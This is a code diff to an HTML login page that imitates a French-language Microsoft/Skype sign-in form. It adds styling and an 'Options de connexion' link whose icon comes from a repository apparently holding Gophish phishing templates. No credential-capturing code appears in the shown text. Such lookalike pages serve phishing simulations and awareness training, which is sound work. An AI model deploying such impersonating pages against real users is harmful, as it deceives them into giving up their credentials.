@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
@@ -79,6 +78,28 @@
         .horizontal-links a:hover {
             text-decoration: underline;
         }
+        .connection-options {
+            background: white;
+            border: 1px solid #ccc;
+            padding: 12px;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .connection-options:hover {
+            background: #f9f9f9;
+        }
+        .connection-options img {
+            width: 20px;
+            margin-right: 10px;
+        }
+        .connection-options a {
+            color: #1b1b1b;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
     </style>
 </head>
 <body>
@@ -91,6 +112,13 @@
         <form autocomplete="off">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" placeholder="E-mail, téléphone ou identifiant Skype" required>
+            </div>
+
+            <div class="connection-options">
+                <a href="#">
+                    <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png" alt="Options de connexion">
+                    <span>Options de connexion</span>
+                </a>
             </div>
 
             <div class="horizontal-links">
